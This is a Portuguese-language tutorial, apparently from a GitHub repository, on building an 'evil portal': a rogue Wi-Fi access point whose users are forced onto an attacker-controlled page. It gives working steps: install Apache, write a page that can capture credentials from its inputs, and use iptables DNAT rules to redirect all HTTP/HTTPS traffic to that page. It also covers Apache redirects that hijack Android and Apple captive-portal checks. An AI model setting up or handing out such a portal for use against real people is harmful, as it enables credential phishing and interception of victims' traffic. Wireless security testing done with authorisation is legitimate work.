
Para melhor aproveitamento é recomendado aprender a criar um AP usando o tutoial da  [Tecnica-FakeAP](https://github.com/them3x/tutoriais/blob/main/Tecnica-FakeAP.md)

#### Tecnica Evil PORTAL

Antes de mais nada vamos precisar configurar nosso servidor WEB
```
apt install apache2
```
Agora podemos criar e configurar nossa pagina que sera exibida no navegador do cliente sempre que gerar qualquer trafego HTTP/HTTPS<br><br>
Você pode instalar o PHP para ser capaz de criar uma pagina WEB mais elaborada para capturar credenciais dos inputs

```
nano /var/www/html/index.html
<h1> PAGINA WEB EXEMPLO</h1>
```
Uma vez configurado nossa pagina WEB e nosso [Fake AP](https://github.com/them3x/tutoriais/blob/main/Tecnica-FakeAP.md)
 usando hostapd, vamos analizar nossa interface de rede para descobrir nosso endereço IP

```
root@debian:~# ifconfig

wlxaca21394a7b7: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.10.1  netmask 255.255.255.0  broadcast 0.0.0.0
        ether 72:81:8c:52:b5:29  txqueuelen 1000  (Ethernet)
        RX packets 6384  bytes 1296162 (1.2 MiB)
        RX errors 0  dropped 24  overruns 0  frame 0
        TX packets 12401  bytes 8935299 (8.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Tudo que precisamos fazer para evoluir nosso fakeAP para um Evil portal é redirecionar todo trafego HTTP/HTTPS para nosso servidor WEP
```
iptables -t nat -A PREROUTING -i wlxaca21394a7b7 -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80
iptables -t nat -A PREROUTING -i wlxaca21394a7b7 -p tcp --dport 443 -j DNAT --to-destination 192.168.10.1:80
```
Altere o IP para o IP correspondente da sua interface
<br><br>
Uma vez configurado o redirecionamento, vamos configurar nosso servidor apache para que os dispositivos quando conectados "detectem" a necessidade de uma "autenticação"
```
nano /etc/apache2/sites-available/000-default.conf
```
Vamos adicionar as seguintes linhas em nosso VirtualHost
```
<VirtualHost *:80>
        # Redirecionamento para Android
        Redirect "/generate_204" http://192.168.10.1/index.html

        # Redirecionamento para dispositivos Apple
        Redirect "/hotspot-detect.html" http://192.168.10.1/index.html

        # Configuração de ErrorDocument como fallback
        ErrorDocument 404 /index.html

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
Agora vamos reiniciar o apache e o nosso servidor AP

```
systemctl restart hostapd
systemctl restart apache2
```
Agora nosso "captive portal" ja deveria estar funcionando corretamente.
